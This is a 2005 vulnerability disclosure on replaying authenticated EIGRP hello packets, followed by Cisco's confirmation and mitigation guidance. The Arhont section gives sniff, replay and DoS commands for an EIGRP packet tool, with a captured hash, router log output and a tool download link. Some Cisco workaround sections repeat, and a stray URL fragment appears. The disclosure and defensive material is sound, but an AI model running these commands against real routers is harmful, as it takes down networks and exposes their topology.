Arhont Ltd.- Information Security
Arhont Advisory by: Arhont Ltd
Advisory: Authenticated EIGRP DoS / Information leak
Class: design bug
Version: EIGRP version 1.2
Model Specific: Other versions might have the same bug
DETAILS:
From experiments with capturing and replaying back at the router a
variety of authenticated EIGRP packets, it appears that the MD5
algorithm is ran against the following packet fields: Opcode, AS number,
Flags, Sequence Number, Nexthop. Thus, the presence of Message
Authentication Code (MAC) does not stop attackers from replaying HELLO
packets back at the router. The only condition is needed is to sniff the
hash and throw it back at the EIGRP routers. An example of this would be
1. Sniff
arhontus# ./eigrp.pl --sniff --iface eth0
<skip>
<<<Authentication data: 0002>>>
Size: 40
Key ID: 2
MD5 key digest: efe07403446c77a9697fe5753f79e52
Key in one string (Copy & paste to replay)
00020010000000020000000000000000000000000efe07403446c77a9697fe5753f79e52
2. Replay
arhontus#./eigrp.pl --hello --auth
00020010000000020000000000000000000000000efe07403446c77a9697fe5753f79e52
The packets are received well and trigger back an EIGRP update to sniff
it and find more about the network topology:
061751: 04:13:46: EIGRP: received packet with MD5 authentication, key id = 2
061752: 04:13:46: EIGRP: Received HELLO on Ethernet0/0 nbr 192.168.66.112
061753: 04:13:46: AS 1, Flags 0x0, Seq 0/0 idbQ 0/0 iidbQ un/rely 0/0
peerQ un/rely 0/1
061754: 04:13:46: EIGRP: Sending UPDATE on Ethernet0/0 nbr
192.168.66.112, retry 2, RTO 4500
061755: 04:13:46: AS 1, Flags 0x9, Seq 2162/0 idbQ 1/0 iidbQ un/rely
0/0 peerQ un/rely 0/1 serno 3-8
As a result of it, additional information about the EIGRP domain can be
collected from the triggered UPDATE packets.
Besides, using this method the FX EIGRP/ARP DoS attack (BID 6443) can be
ported to the authenticated EIGRP routing domain. This is done by
combining --hellodos and --auth <captured hash> flags when running the
attack using our EIGRP packet generator. The attack appears to be more
efficient, than the original attack described by FX, since the routers
recover much slower. This is possibly due to the additional overhead of
processing the authentication information. An example of the attack
command killing the network would be
arhontus#./eigrp.pl --hellodos 192.168.66.0 --auth
00020010000000020000000000000000000000000efe07403446c77a9697fe5753f79e52
--source 192.168.66.112
Tool: http://www.hackingciscoexposed.com/tools/eigrp-tools.tar.gz
Risk Factor: Medium for DoS, Low for the Information Leak
Workarounds: Extend the Message Authentication Code onto the currently
unauthenticated EIGRP packet fields.
Communication History: sent to PSIRT on 10/10/05
\*According to the Arhont Ltd. policy, all of the found vulnerabilities
and security issues will be reported to the manufacturer at least 7 days
before
releasing them to the public domains (such as CERT and BUGTRAQ).
If you would like to get more information about this issue, please do
not hesitate to contact Arhont team.\*

Posting: Unauthenticated EIGRP DoS
+---------------------------------

Original Posting:
<http://lists.grok.org.uk/pipermail/full-disclosure/2005-December/040330>.

Cisco confirms the reports made by Arhont Ltd.

Within this article two separate vulnerabilities are raised:

a) EIGRP ARP DoS attacks
   Reference is drawn to "<http://www.securityfocus.com/bid/6443>", which
   discusses EIGRP ARP DoS attacks. This topic has been previously
   addressed by Cisco. Please refer to:

<http://www.cisco.com/en/US/tech/tk365/technologies_security_notice09186a>
008011c5e1.html

   This is documented in Cisco Bug ID: "CSCsc15285 -- EIGRP ARP DoS"
   No additional information is available at this time.

b) Directed DoS attack employing the EIGRP "Goodbye Message"
   The EIGRP implementation in all versions of IOS is vulnerable to a
   denial of service on selective neighbors, if it receives a spoofed
   neighbor announcement with either mismatched "k" values, or "Goodbye
   Message" TLV .

   Forged packets can be injected into a network from a location outside
   its boundary so that they are trusted as authentic by the receiving
   host, thus resulting in a failure of integrity. Such packets could
   result in routing neighbor relationships being torn down and
reformed.

   Repeated exploitation could result in a sustained DoS attack. From a
   position within the network where it is possible to receive the
return
   traffic or create neighbor establishments (but not necessarily in a
   position that is directly in the traffic path), a greater range of
   violations is possible. For example, the contents of a message could
   be diverted, modified, and then returned to the traffic flow again,
   causing a failure of integrity and a possible failure of
   confidentiality.

   EIGRP can operate in two modes - Unicast Hellos; Multicast Hellos.

   IOS versions 12.0(7)T and later, unicast hellos will be rejected
unless
   explicitly configured in the neighbor statements. Once static
neighbors
   are configured, IOS will only accept hello packets from defined
neighbors.

    Cisco is tracking this report as part of:
    CSCsc13698 -- directed DoS attack employing the EIGRP "Goodbye
Message"

    Cisco recommends protecting from forged source neighbor packets
    leveraging MD5 authentication and/or infrastructure protection
schemes.

    Within the workarounds section the following will apply:

    * Static configured EIGRP neighbors (IOS versions 12.0(7)T and
later)
    * Blocking access to the core infrastructure
    * Configure anti-spoofing measures on the network edge
    * 802.1x based port security
    * MD5 Neighbor Authentication

Cisco confirms the reports made by Arhont Ltd.

- From a position within an EIGRP authenticated AS where it is possible
to
receive/listen to EIGRP Hello Updates, it is possible, with reply
attacks,
to forge illegitimate hello packets in an authenticated AS. This can
result
in additional information about the EIGRP domain being collected from
the
triggered UPDATE packets, by the malicious device. This could also
result in
carrying out similar DoS attacks as per "CSCsc15285 -- EIGRP ARP DoS",
however within an authenticated AS.

Cisco recommends proper securing of the IGP routers. Mechanisms such as
port
security or 802.1x may be used to ensure only valid routing devices are
connected to the common segments.

Cisco is tracking this report as part of:
CSCsc13724 -- Authenticated EIGRP DoS attack/Information Leakage

Within the workarounds Section the following will apply:
* Blocking access to the core infrastructure
* 802.1x based port security

Workarounds
===========

Ensuring that the infrastructure devices are protected, by both local
and
remote access means will help mitigate these vulnerabilities.

Blocking access to the core infrastructure
+-----------------------------------------
Although it is often difficult to block traffic transiting your network,
it
is possible to identify traffic which should never be allowed to target
your
infrastructure devices and block that traffic at the border of your
network.

Infrastructure access control lists (ACLs) are considered a network
security
best practice and should be considered as a long-term addition to good
network security as well as a workaround for this specific
vulnerability.

The white paper entitled:
"Protecting Your Core: Infrastructure Protection Access Control Lists",
available at <http://www.cisco.com/warp/public/707/iacl.html>, presents
guidelines and recommended deployment techniques for infrastructure
protection ACLs. Exceptions would include any devices which have a
legitimate
reason to access your infrastructure (for example, BGP peers, NTP
sources,
DNS serves, and so on). All other traffic must be able to traverse your
network without terminating on any of your devices.

Configure anti-spoofing measures on the network edge
+---------------------------------------------------
In order for an adversary to use the attack vector described in this
advisory,
it must send packets with the source IP address equal to one of the IP
addresses in the subnet of the EIGRP neighbors. You can block spoofed
packets
either using the Unicast Reverse Path Forwarding (uRPF) feature or by
using
access control lists (ACLs).

By enabling uRPF, all spoofed packets will be dropped at the first
device.
To enable uRPF, use the following commands:

 router(config)#ip cef
 router(config)#ip verify unicast reverse-path </pre>

The configuration guide, available at:
<http://www.cisco.com/en/US/products/sw/iosswrel/ps1835/products_configur>
ation_guide_chapter09186a00804b046b.html
presents guidelines on how uRPF works and how to configure it in various

scenarios. This is especially important if you are using asymmetric
routing.

ACLs should also be deployed as close to the edge as possible. Unlike
uRPF,
you must specify the exact IP range that is permitted. Specifying which
addresses should be blocked is not the optimal solution because it tends
to
be harder to maintain.

Caution: In order for anti-spoofing measures to be effective, they must
be
         deployed at least one hop away from the devices which are being

         protected. Ideally, they will be deployed at the network edge
facing
         your customers.

802.1x based port security
+-------------------------
To prevent unauthorized local access to the routing subnets that the
EIGRP
neighbor relationships exist on, deploying 802.1x on the router and
switches
(in 802.1x mutual authentication) would help mitigate any local attacks.

For further information on how to configure 802.1x and products
supported
refer to:
<http://www.cisco.com/univercd/cc/td/doc/product/software/ios123/123newft>
/123limit/123x/123xa/gt_802_1.htm#wp1166017

Static defined peers
+-------------------
If neighbors are explicitly configured post integration of CSCdm81710
(IOS versions 12.0(7)T or later), this acts as a workaround for these
vulnerabilities. Pre CSCdm81710, explicit neighbors are still subject to

DoS attacks of this nature.

Example post CSCdm81710:

 router eigrp 1
 network 192.168.1.0
 network 192.168.66.0
 neighbor 192.168.66.2 FastEthernet0/0
 neighbor 192.168.66.1 FastEthernet0/0
 no auto-summary

23tip2r/ip2_n1gt.htm#wp1110498

MD5 Neighbor Authentication
+--------------------------
Enabling MD5, will mitigate remote malicious tear down of neighbors, by
the
methods described within this document.

<http://www.cisco.com/univercd/cc/td/doc/product/software/ios123/123newft/123limit/123x/123xa/gt_802_1.htm#wp1166017>

Static defined peers
+-------------------
If neighbors are explicitly configured post integration of CSCdm81710
(IOS versions 12.0(7)T or later), this acts as a workaround for these
vulnerabilities. Pre CSCdm81710, explicit neighbors are still subject to
DoS attacks of this nature.

Example post CSCdm81710:

 router eigrp 1
 network 192.168.1.0
 network 192.168.66.0
 neighbor 192.168.66.2 FastEthernet0/0
 neighbor 192.168.66.1 FastEthernet0/0
 no auto-summary

<http://www.cisco.com/univercd/cc/td/doc/product/software/ios123/123tcr/123tip2r/ip2_n1gt.htm#wp1110498>

MD5 Neighbor Authentication
+--------------------------
Enabling MD5, will mitigate remote malicious tear down of neighbors, by the
methods described within this document.
